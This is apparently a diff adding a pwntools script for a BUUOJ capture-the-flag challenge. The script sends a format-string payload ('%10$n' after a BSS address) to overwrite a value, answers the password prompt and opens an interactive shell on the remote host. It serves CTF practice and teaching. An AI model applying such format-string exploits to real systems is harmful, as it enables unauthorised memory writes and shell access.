@@ -1,0 +1,10 @@
+from pwn import *
+#context(arch='i386',os='linux',log_level='debug')
+p=remote("node4.buuoj.cn",26995)
+#p=process("./PWN5")
+bss=0x0804C044
+payload=p32(bss)+b'%10$n'
+p.sendlineafter("your name:",payload)
+p.sendlineafter("your passwd:",'4')
+
+p.interactive()
